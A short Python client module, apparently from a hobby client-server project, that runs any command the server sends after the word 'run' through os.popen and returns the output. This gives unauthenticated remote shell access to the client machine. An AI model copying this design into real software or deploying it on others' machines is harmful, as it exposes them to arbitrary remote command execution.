import os
from DataFormatter import Protocol_Receive, Protocol_Send

##These are commands called from the server but must be executed client side.
def Run_Command(connection, split_data):
    data = " ".join(split_data[1:])
    stream = os.popen(data)
    output = stream.read()
    Protocol_Send(connection, output)

client_side_commands=["run"]
def Check_For_Client_Command(split_data):
    for i in range(4,0,-1):
        command = " ".join(split_data[0:i])
        if command in client_side_commands:
            return command

def Client_Command(connection, data):
    try:
        split_data = data.lower().split(" ")
        command = Check_For_Client_Command(split_data)
        if command:
            Run_Command(connection, split_data)
            print(f"{data} called from server.")
        else:
            print(data)
    except:
        print(f"server: {data}")
